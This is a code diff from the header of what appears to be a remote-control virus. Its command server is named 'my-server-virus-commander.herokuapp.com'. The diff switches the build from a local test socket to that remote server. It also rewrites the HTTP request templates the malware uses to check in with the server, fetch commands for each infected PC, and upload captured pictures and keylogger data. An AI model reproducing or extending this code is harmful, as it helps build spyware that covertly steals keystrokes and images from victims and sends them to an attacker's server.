@@ -22,12 +22,12 @@
 
 
 // global variables for the socket connection has made with the heroku server. -> only if running on to server
-//extern char SOCKET_IP[16];
-//extern int SOCKET_PORT;
+extern char SOCKET_IP[16];
+extern int SOCKET_PORT;
 
 // if running locally
-#define SOCKET_IP "127.0.0.1"
-#define SOCKET_PORT 8000
+//#define SOCKET_IP "127.0.0.1"
+//#define SOCKET_PORT 8000
 
 #define DOMAIN_NAME "my-server-virus-commander.herokuapp.com"
 
@@ -42,15 +42,15 @@
 #define SIZE_OF_COMMAND 20
 #define END_OF_HEADERS "\r\n\r\n"
 #define FIRST_CONNECTION_MSG "POST /first_connection HTTP/1.1\r\nAccept: application/json\r\nContent-Type: application/json"
-#define GET_COMMAND_MSG "GET /command/%s HTTP/1.1\r\nAccept: application/json\r\nHost: %s:%d\r\n\r\n"
-//						     pc_name^^^^^                                      socket_ip^  ^socket_port
+#define GET_COMMAND_MSG "GET /command/%s HTTP/1.1\r\nAccept: application/json\r\nHost: %s\r\n\r\n"
+//						     pc_name^^^^^                                    domain_name^  
 
-#define POST_PICTURE_MSG "POST /%s/picture HTTP/1.1\r\nAccept: application/json\r\nContent-Type: application/json\r\nContent-Length: %d\r\nHost: %s:%d\r\n\r\n{%cpicture_content%c:%c"/*%s%c}  ->  added in the function*/
-//						pc_name^											                	                          data_length^  socket_ip^  ^socket_port                   ^picture_data
+#define POST_PICTURE_MSG "POST /%s/picture HTTP/1.1\r\nAccept: application/json\r\nContent-Type: application/json\r\nContent-Length: %d\r\nHost: %s\r\n\r\n{%cpicture_content%c:%c"/*%s%c}  ->  added in the function*/
+//						pc_name^											                	                          data_length^ domain_name^                   ^picture_data
 
 
-#define POST_Key_Logger_MSG "POST /%s/key_logger HTTP/1.1\r\nAccept: application/json\r\nContent-Type: application/json\r\nContent-Length: %d\r\nHost: %s:%d\r\n\r\n{%ckey_logger%c:%c%s%c}"
-//						    pc_name^						  				                									 data_length^  socket_ip^  ^socket_port                ^key_logger_data
+#define POST_Key_Logger_MSG "POST /%s/key_logger HTTP/1.1\r\nAccept: application/json\r\nContent-Type: application/json\r\nContent-Length: %d\r\nHost: %s\r\n\r\n{%ckey_logger%c:%c%s%c}"
+//						    pc_name^						  				                									 data_length^ domain_name^                ^key_logger_data
 
 
 
